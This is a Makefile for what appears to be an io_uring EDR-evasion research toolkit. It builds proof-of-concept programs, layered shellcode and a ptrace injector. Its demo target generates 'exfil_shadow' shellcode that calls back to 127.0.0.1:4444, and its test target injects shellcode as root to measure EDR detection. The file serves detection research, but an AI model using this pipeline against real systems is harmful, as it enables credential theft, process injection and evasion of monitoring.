# I-OWN-URING — top-level Makefile
#
# Targets:
#   make           Build everything (poc, shellcode, injector)
#   make poc       Build C PoCs
#   make shellcode Assemble shellcode layers
#   make builder   Run builder tests
#   make inject    Build ptrace injector
#   make test      Run full EDR matrix (needs root)
#   make demo      Quick smoke-test: build + verify shellcode
#   make clean     Remove all build artifacts
#   make help      Show this list

.PHONY: all poc shellcode builder inject test demo clean help

# ----------------------------------------------------------------
all: poc shellcode inject
	@echo ""
	@echo "[+] Build complete. Next steps:"
	@echo "    make demo   — smoke-test the shellcode"
	@echo "    make test   — run EDR detection matrix (root needed)"
	@echo "    make help   — full target list"

# ----------------------------------------------------------------
poc:
	@echo "[*] Building C PoCs..."
	$(MAKE) -C poc
	@echo "[+] PoCs: poc/hello_uring  poc/file_exfil_uring  poc/sqpoll_uring"

# ----------------------------------------------------------------
shellcode:
	@echo "[*] Assembling shellcode..."
	$(MAKE) -C shellcode
	@echo "[+] Binary: shellcode/combined/shellcode.bin"

# ----------------------------------------------------------------
builder:
	@echo "[*] Running builder tests..."
	python3 -m pytest builder/tests/ -v
	@echo "[+] Builder tests passed"

# ----------------------------------------------------------------
inject:
	@echo "[*] Building ptrace injector..."
	$(MAKE) -C testing
	@echo "[+] Injector: testing/injector/inject"

# ----------------------------------------------------------------
# Quick smoke-test: build + generate + verify offsets
demo: shellcode
	@echo "[*] Generating exfil_shadow shellcode..."
	python3 builder/uring_builder.py \
	    builder/missions/exfil_shadow.yaml \
	    --ip 127.0.0.1 --port 4444 \
	    --out /tmp/demo_shellcode.bin \
	    --header /tmp/demo_shellcode.h \
	    --quiet
	@echo "[*] Verifying binary..."
	python3 shellcode/combined/extract.py /tmp/demo_shellcode.bin --no-array
	@echo "[+] Demo complete"

# ----------------------------------------------------------------
# Full EDR matrix — needs root and Falco (optional)
SC ?= shellcode/combined/shellcode.bin
test: inject shellcode
	@echo "[*] Running EDR detection matrix (root required)..."
	sudo testing/run_matrix.sh $(SC) /etc/hostname
	@echo "[+] Results: testing/results/edr_matrix.md"

# ----------------------------------------------------------------
clean:
	$(MAKE) -C poc     clean 2>/dev/null || true
	$(MAKE) -C shellcode clean 2>/dev/null || true
	$(MAKE) -C testing  clean 2>/dev/null || true
	rm -f shellcode.bin shellcode.h
	rm -f /tmp/demo_shellcode.bin /tmp/demo_shellcode.h
	@echo "[+] Clean complete"

# ----------------------------------------------------------------
help:
	@echo ""
	@echo "I-OWN-URING — io_uring EDR evasion research"
	@echo ""
	@echo "Targets:"
	@printf "  %-18s %s\n" "make"          "Build PoCs + shellcode + injector"
	@printf "  %-18s %s\n" "make poc"      "Build C PoCs in poc/"
	@printf "  %-18s %s\n" "make shellcode" "Assemble shellcode layers"
	@printf "  %-18s %s\n" "make builder"  "Run builder pytest suite"
	@printf "  %-18s %s\n" "make inject"   "Build ptrace injector"
	@printf "  %-18s %s\n" "make demo"     "Smoke-test: build + validate shellcode"
	@printf "  %-18s %s\n" "make test"     "Full EDR matrix (needs root)"
	@printf "  %-18s %s\n" "make clean"    "Remove all build artifacts"
	@echo ""
	@echo "Quick start:"
	@echo "  make && make demo"
	@echo ""
	@echo "Full test with Falco:"
	@echo "  sudo make test"
	@echo ""
